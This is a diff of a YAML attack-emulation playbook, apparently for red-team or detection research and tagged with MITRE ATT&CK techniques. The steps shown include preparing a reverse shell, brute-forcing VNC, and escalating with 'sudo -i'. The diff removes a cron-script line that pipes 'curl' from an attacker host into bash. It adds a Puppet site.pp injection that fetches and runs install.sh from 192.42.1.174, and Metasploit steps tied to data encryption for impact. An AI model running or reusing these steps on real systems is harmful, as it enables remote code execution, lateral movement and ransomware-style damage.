@@ -1,6 +1,6 @@
 ####################
 #
-# Scenario 3 b a
+# Scenario 3 b d
 #
 ####################
 
@@ -21,7 +21,8 @@ vars:
   - "12345678"
  
 commands:
-### PREPARE THE REVERSE SHELL FOR THE LINUXSHARE
+
+### PREPARE THE REVERSE SHELL FOR THE REPOSERVER
   - type: mktemp
     cmd: file
     variable: RSHELL
@@ -48,6 +49,7 @@ commands:
     port: 8888
     background: True
     kill_on_exit: true
+
 
 ### BRUTEFORCE VNC
   - type: loop
@@ -105,9 +107,27 @@ commands:
     cmd: type
     input: "sudo -i"
     metadata:
-      techniques: "T1021.005"
-      tactics: "Lateral Movement"
-      technique_name: "Remote Services: VNC"
+      techniques: "T1078.003"
+      tactics: "Privilege Escalation"
+      technique_name: "Valid Accounts: Local Accounts"
+      action: "sudo -i"
+
+  - type: sleep
+    seconds: 3
+
+  - type: vnc
+    session: foothold
+    cmd: key
+    key: "enter"
+
+  - type: vnc
+    session: foothold
+    cmd: type
+    input: "sudo -i"
+    metadata:
+      techniques: "T1078.003"
+      tactics: "Privilege Escalation"
+      technique_name: "Valid Accounts: Local Accounts"
       action: "sudo -i"
 
   - type: sleep
@@ -210,52 +230,47 @@ commands:
     seconds: 2 
 
 #  HERE THE LATERAL MOVEMENT TAKES PLACE
+
   - type: vnc
     session: foothold
     cmd: type
-    input: echo "curl http://$ATTACKER_ADDRESS:8888/install.sh | bash" >> /media/share/healthcheck_cron.sh
+    input: "echo -e \"\\nclass blah2 {\\n  exec { \\\"curl http://192.42.1.174:88"
     metadata:
-      techniques: "T1105,T1059.004,T1053.003,T1021.005,T1071.001"
-      tactics: "Execution,Defense Evasion,Persistence,Command and Control"
-      technique_name: "Ingress Tool Transfer,Command and Scripting Interpreter: Unix Shell,Scheduled Task/Job: Cron,Remote Services: VNC,Application Layer Protocol: Web Protocols"
-      action: "echo 'curl http://$ATTACKER_ADDRESS:8888/install.sh | bash' >> /media/share/healthcheck_cron.sh"
+      action: "modifying site.pp"
 
   - type: sleep
     seconds: 2
+  
+  - type: vnc
+    session: foothold
+    cmd: type
+    input: "88/install.sh | bash\\\":\\n    path => ['/usr/bin','/bin']\\n  }\\n}\\n\\nnode 'linuxshare.attack"
+    metadata:
+      action: "modifying site.pp"
+
+  - type: sleep
+    seconds: 2
+  
+  - type: vnc
+    session: foothold
+    cmd: type
+    input: "bed.local' {\\n  class { 'blah2': }\\n}\\n\" >> /etc/puppetlabs/code/environments/production/manifests/site.pp"
+    metadata:
+      action: "modifying site.pp"
+      
+  - type: sleep
+    seconds: 2 
 
   - type: vnc
     session: foothold
     cmd: key
     key: "enter"
-
-  - type: sleep
-    seconds: 1
-
-  - type: vnc
-    cmd: close
-    session: foothold
     metadata:
-      techniques: "T1021.005"
-      tactics: "Lateral Movement"
-      technique_name: "Remote Services: VNC"
+      techniques: "T1072,T1105,T1059.004"
+      tactics: "Execution, Lateral Movement"
+      technique_name: "Software Deployment Tools,Ingress Tool Transfer,Command and Scripting Interpreter: Unix Shell"
 
-#################### MOVED ############################################
-  - type: msf-session
-    session: movement
-    cmd: sysinfo
-    metadata:
-      techniques: "T1082"
-      tactics: "Discovery"
-      technique_name: "System Information Discovery"
-
-  - type: msf-session
-    session: movement
-    cmd: getuid
-    metadata:
-      techniques: "T1033"
-      tactics: "Discovery"
-      technique_name: "System Owner/User Discovery"
-
+#################### MOVED ################################
   - type: msf-session
     session: movement
     cmd: shell
@@ -274,7 +289,7 @@ commands:
     metadata:
       techniques: "T1486,T1105"
       tactics: "Impact,Command and Control"
-      technique_name: "Data Encrypted for Impact,Ingress Tool Transfer"
+      technique_name: "Data Encrypted for Impact, Ingress Tool Transfer"
 
   - type: msf-session
     session: movement
@@ -282,7 +297,7 @@ commands:
     metadata:
       techniques: "T1486,T1565.001"
       tactics: "Impact"
-      technique_name: "Data Encrypted for Impact,Data Manipulation: Stored Data Manipulation"
+      technique_name: "Data Encrypted for Impact, Data Manipulation: Stored Data Manipulation"
 
   - type: msf-session
     session: movement
